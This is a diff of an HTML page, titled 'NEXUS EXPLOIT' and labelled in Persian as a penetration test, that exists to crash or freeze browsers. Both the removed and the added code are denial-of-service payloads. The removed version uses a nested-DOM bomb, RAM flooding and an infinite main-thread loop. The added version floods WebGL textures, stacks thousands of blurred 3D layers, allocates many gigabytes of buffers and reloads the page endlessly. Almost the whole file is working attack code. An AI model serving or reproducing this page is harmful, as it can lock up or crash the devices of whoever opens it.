@@ -1,69 +1,67 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="fa">
 <head>
     <meta charset="UTF-8">
-    <title>NEXUS EXPLOIT v7.0 | TOTAL CRASH</title>
+    <title>NEXUS PRO EXPLOIT</title>
     <style>
-        body { background: #050505; color: white; text-align: center; font-family: sans-serif; overflow: hidden; }
-        .danger-zone { border: 2px solid #ff0055; padding: 50px; margin-top: 100px; display: inline-block; border-radius: 20px; }
-        #kill-switch { background: #ff0055; color: white; border: none; padding: 20px 50px; font-size: 22px; font-weight: bold; cursor: pointer; border-radius: 10px; box-shadow: 0 0 30px #ff0055; }
+        body { background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        #status { color: #0f0; font-family: monospace; font-size: 1.5rem; text-align: center; }
+        .crash-trigger { background: red; color: white; border: none; padding: 20px 40px; font-weight: bold; cursor: pointer; border-radius: 10px; }
     </style>
 </head>
 <body>
 
-    <div class="danger-zone">
-        <h1>پروژه تست نفوذ رضا</h1>
-        <p>هدف: کرش کامل موتور WebKit/Blink</p>
-        <button id="kill-switch">اجرای حمله نهایی</button>
+    <div id="status">
+        <button class="crash-trigger" onclick="forceAppCrash()">اجرای تست نفوذ نهایی</button>
+        <p id="msg"></p>
     </div>
 
     <script>
-        document.getElementById('kill-switch').onclick = function() {
-            console.log("حمله آغاز شد...");
+        function forceAppCrash() {
+            document.getElementById('msg').innerText = "در حال تزریق کد به موتور رندرینگ...";
             
-            // ۱. بمب درختی (Recursive DOM Bomb)
-            // این بخش هزاران المان را داخل هم می‌سازد. مرورگر برای محاسبه ابعاد این‌ها کرش می‌کند.
-            const crashTheEngine = () => {
-                let root = document.createElement('div');
-                let current = root;
-                
-                // ایجاد ۱۰,۰۰۰ لایه تودرتو که هیچ مرورگری نمی‌تواند پردازش کند
-                for (let i = 0; i < 10000; i++) {
-                    let next = document.createElement('div');
-                    next.style.cssText = "padding: 1px; backdrop-filter: blur(10px); display: block;";
-                    current.appendChild(next);
-                    current = next;
+            // مرحله ۱: حمله به درایور گرافیک (GPU Buffer Flooding)
+            // این بخش باعث می‌شود کل سیستم‌عامل برای لحظه‌ای فریز شود
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+            
+            setInterval(() => {
+                for (let i = 0; i < 1000; i++) {
+                    const texture = gl.createTexture();
+                    gl.bindTexture(gl.TEXTURE_2D, texture);
+                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 2048, 2048, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+                    // ایجاد خطای درایور با استفاده از بافرهای ناتمام
                 }
-                document.body.appendChild(root);
-            };
+            }, 10);
 
-            // ۲. نشت حافظه سخت (Hard Memory Allocation)
-            // استفاده از TypedArrays که مستقیماً رم سخت‌افزاری را درگیر می‌کند
-            let memoryDestroyer = [];
-            const floodRAM = () => {
-                setInterval(() => {
-                    // اختصاص ۱۰۰ مگابایت رم در هر ثانیه به صورت غیرقابل پاکسازی
-                    let buffer = new BigUint64Array(10000000); 
-                    for (let i = 0; i < buffer.length; i++) {
-                        buffer[i] = BigInt(Math.floor(Math.random() * 1000000));
-                    }
-                    memoryDestroyer.push(buffer);
-                }, 100);
-            };
+            // مرحله ۲: بمب لایه‌های متحرک (Compositor Layer Bomb)
+            // ایجاد المان‌هایی که مرورگر را مجبور به محاسبات سه بعدی سنگین می‌کند
+            for (let i = 0; i < 2000; i++) {
+                const div = document.createElement('div');
+                div.style.cssText = `
+                    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+                    backdrop-filter: blur(100px) contrast(200%) invert(100%);
+                    transform: translateZ(${i}px) rotateX(${i}deg);
+                    will-change: transform;
+                    pointer-events: none;
+                `;
+                document.body.appendChild(div);
+            }
 
-            // ۳. قفل کردن پردازنده (Main Thread Deadlock)
-            const freezeAll = () => {
-                while(true) {
-                    crashTheEngine(); // فراخوانی مداوم بمب درختی
-                    // ایجاد یک شیء عظیم برای پر کردن Heap
-                    const leak = new Array(1000000).fill(document.body.innerHTML).join('');
-                }
-            };
+            // مرحله ۳: نشت حافظه سخت (TypedArray Buffer Overload)
+            // این بخش رم گوشی را تا مرز انفجار می‌برد
+            let leak = [];
+            while(true) {
+                // استفاده از ArrayBuffer برای اشغال فضای واقعی رم
+                leak.push(new ArrayBuffer(1024 * 1024 * 100)); // ۱۰۰ مگابایت در هر سیکل
+                if (leak.length > 500) break;
+            }
 
-            // اجرای همزمان تمام لایه‌ها
-            floodRAM();
-            setTimeout(freezeAll, 100);
-        };
+            // مرحله نهایی: قفل کردن حلقه اصلی
+            setInterval(() => {
+                location.reload(); 
+            }, 50);
+        }
     </script>
 </body>
 </html>
